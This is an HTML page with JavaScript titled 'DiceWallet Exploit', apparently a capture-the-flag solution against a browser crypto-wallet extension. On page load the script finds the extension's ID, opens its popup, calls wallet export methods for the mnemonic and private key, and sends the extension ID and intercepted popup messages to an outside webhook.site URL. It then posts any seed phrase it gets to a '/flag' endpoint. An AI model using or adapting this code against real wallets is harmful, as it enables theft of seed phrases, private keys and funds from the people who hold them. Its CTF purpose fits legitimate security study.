<!DOCTYPE html>
<html>
<head>
    <title>DiceWallet Exploit - Popup Method</title>
</head>
<body>
    <h1>DiceWallet Exploit</h1>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://a01e28d1-26bd-4236-b3de-72d0a426ca16.webhook.site';
        
        function log(msg) {
            document.getElementById('status').innerHTML += '<br>' + msg;
            console.log(msg);
        }
        
        async function exploit() {
            log('1. Looking for extension ID...');
            
            // Tìm extension ID
            const scripts = document.getElementsByTagName('script');
            let extensionId = null;
            let extensionUrl = null;
            
            for (let script of scripts) {
                const src = script.src;
                if (src && src.startsWith('moz-extension://')) {
                    extensionUrl = src;
                    extensionId = src.split('/')[3];
                    log(`✅ Found extension: ${extensionId}`);
                    break;
                }
            }
            
            if (!extensionId) {
                log('❌ No extension found');
                return;
            }
            
            // Gửi extension ID về webhook
            fetch(`${WEBHOOK_URL}?extensionId=${extensionId}`);
            
            log('2. Setting up message listener...');
            
            // Lắng nghe messages từ popup
            window.addEventListener('message', (e) => {
                if (e.data && (e.data.type === 'DICE_RESPONSE' || e.data.type === 'DICE_ERROR')) {
                    log('📨 Received message from popup:', e.data);
                    
                    // Gửi về webhook
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'popup_message',
                            data: e.data
                        })
                    });
                    
                    // Nếu có mnemonic hoặc private key
                    if (e.data.result && (e.data.result.mnemonic || e.data.result.privateKey)) {
                        log('🎯 Found credentials!');
                        
                        // Thử gửi flag
                        const mnemonic = e.data.result.mnemonic || e.data.result.privateKey;
                        fetch('/flag', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ mnemonic })
                        }).then(r => r.json()).then(data => {
                            if (data.flag) {
                                log(`🏁 FLAG: ${data.flag}`);
                            }
                        });
                    }
                }
            });
            
            log('3. Opening popup.html...');
            
            // Mở popup
            const popupUrl = `moz-extension://${extensionId}/popup.html`;
            const popup = window.open(popupUrl, '_blank', 'width=400,height=600');
            
            if (!popup) {
                log('❌ Cannot open popup - blocked by browser');
                
                // Thử cách khác: tạo iframe
                log('Trying iframe instead...');
                const iframe = document.createElement('iframe');
                iframe.src = popupUrl;
                iframe.style.width = '400px';
                iframe.style.height = '600px';
                iframe.style.position = 'fixed';
                iframe.style.top = '10px';
                iframe.style.right = '10px';
                iframe.style.zIndex = '9999';
                document.body.appendChild(iframe);
                
                log('Iframe added - check if messages appear');
            }
            
            log('4. Waiting for messages from popup...');
            
            // Thử gửi message đến background script
            try {
                const response = await chrome.runtime.sendMessage(extensionId, {
                    type: 'DICE_POPUP',
                    action: 'getState'
                });
                log('Background response:', response);
            } catch (e) {
                log('Cannot send to background:', e.message);
            }
            
            // Thử gọi các methods qua window.ethereum
            if (window.ethereum) {
                log('5. Testing wallet methods...');
                
                try {
                    const result = await window.ethereum.request({
                        method: 'wallet_exportMnemonic'
                    });
                    log('wallet_exportMnemonic:', result);
                } catch (e) {}
                
                try {
                    const result = await window.ethereum.request({
                        method: 'wallet_exportPrivateKey'
                    });
                    log('wallet_exportPrivateKey:', result);
                } catch (e) {}
            }
            
            log('=== Exploit running - check webhook ===');
        }
        
        // Start
        exploit();
    </script>
</body>
</html>
